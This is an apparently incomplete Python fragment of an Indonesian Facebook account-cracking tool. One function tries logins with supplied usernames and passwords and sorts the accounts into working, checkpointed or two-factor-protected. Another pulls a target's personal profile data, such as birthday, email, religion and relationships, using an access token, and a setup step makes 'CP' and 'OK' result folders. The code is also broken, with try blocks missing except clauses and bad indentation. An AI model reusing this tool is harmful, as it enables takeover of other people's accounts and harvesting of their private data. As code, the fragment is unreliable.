	exit("\n [#] cek akun sudah selesai...") 
def check_in(user, pasw): 
	data = {} 
	mb = ("https://mbasic.facebook.com") 
	ua = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]" 
	ses = requests.Session();ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9"});ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser");fm = ged.find("form",{"method":"post"});list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"] 
	for i in fm.find_all("input"): 
		if i.get("name") in list:data.update({i.get("name"):i.get("value")}) 
		else:continue 
	data.update({"email":user,"pass":pasw}) 
	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser") 
	if "c_user" in ses.cookies.get_dict(): 
		if "Akun Anda Dikunci" in run.text:print(f" {M}[!] Akun terkena sesi new {N}") 
		else:print(f" {H}[!] Akun aman tidak checkpoint{N}") 
	elif "checkpoint" in ses.cookies.get_dict(): 
		eax = re.findall("\<title>(.*?)<\/title>",str(run));form = run.find("form");dtsg = form.find("input",{"name":"fb_dtsg"})["value"];jzst = form.find("input",{"name":"jazoest"})["value"];nh = form.find("input",{"name":"nh"})["value"];dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh};xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser") 
		ngew = [yy.text for yy in xnxx.find_all("option")] 
		if(str(len(ngew)) == "0"): 
			if "Lihat detail login yang ditampilkan. Ini Anda?" in eax: 
				print(f" {H}[*] Akun tap yes, silakan login di fb lite{N}") 
			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(run)):print(" [!] \033[0;91mAkun authentikasi dua faktor aktif\033[0;97m") 
			print(" [*] terdapat "+str(len(ngew))+" opsi checkpoint") 
			for opt in range(len(ngew)): 
				print(" ["+str(opt+1)+"] "+ngew[opt]) 
	elif "login_error" in str(run): 
		oh = run.find("div",{"id":"login_error"}).find("div").text 
		print(" [!] %s"%(oh)) 
	else:print(f" {M}[!] login gagal, silahkan cek kembali id dan kata sandi{N}") 
def infoakun(token): 
	idt = input(" [?] masukan id atau username : ") 
		zx = ses.get("https://graph.facebook.com/"+idt+"?access_token="+token);zy = json.loads(zx.text) 
	except (KeyError,IOError):exit(' %s[!] id tidak ditemukan%s'%(M,N)) 
	try:nm = zy["name"] 
	except (KeyError,IOError):nm = ("-") 
	try:nd = zy["first_name"] 
	except (KeyError,IOError):nd = ("-") 
	try:nt = zy["middle_name"] 
	except (KeyError,IOError):nt = ("-") 
	try:nb = zy["last_name"] 
	except (KeyError,IOError):nb = ("-") 
	try:ut = zy["birthday"] 
	except (KeyError,IOError):ut = ("-") 
	try:gd = zy["gender"] 
	except (KeyError,IOError):gd = ("-") 
	try:em = zy["email"] 
	except (KeyError,IOError):em = ("-") 
	try:lk = zy["link"] 
	except (KeyError,IOError):lk = ("-") 
	try:us = zy["username"] 
	except (KeyError,IOError):us = ("-") 
	try:rg = zy["religion"] 
	except (KeyError,IOError):rg = ("-") 
	try:rl = zy["relationship_status"] 
	except (KeyError,IOError):rl = ("-") 
	try:rls = zy["significant_other"]["name"] 
	except (KeyError,IOError):rls = ("-") 
	try:lc = zy["location"]["name"] 
	except (KeyError,IOError):lc = ("-") 
	try:ht = zy["hometown"]["name"] 
	except (KeyError,IOError):ht = ("-") 
	try:ab = zy["about"] 
	except (KeyError,IOError):ab = ("-") 
	try:lo = zy["locale"] 
	except (KeyError,IOError):lo = ("-") 
	jalan(' [*] Nama : %s'%(nm)) 
	jalan(' [*] Nama Depan : %s'%(nd)) 
	jalan(' [*] Nama Tengah : %s'%(nt)) 
	jalan(' [*] Nama Belakang : %s'%(nb)) 
	jalan(' [*] TTL : %s'%(ut)) 
	jalan(' [*] Gender : %s'%(gd)) 
	jalan(' [*] Email : %s'%(em)) 
	jalan(' [*] Link : %s'%(lk)) 
	jalan(' [*] Username : %s'%(us)) 
	jalan(' [*] Agama : %s'%(rg)) 
	jalan(' [*] Status Hubungan : %s'%(rl)) 
	jalan(' [*] Hubungan Dengan : %s'%(rls)) 
	jalan(' [*] Tempat Tinggal : %s'%(lc)) 
	jalan(' [*] Tempat Asal : %s'%(ht)) 
	jalan(' [*] Tentang : %s'%(ab)) 
	jalan(' [*] Locale : %s'%(lo)) 
def make(): 
	try:os.mkdir("CP") 
	try:os.mkdir("OK") 
	menu() 
if __name__ == '__main__': 
	make()
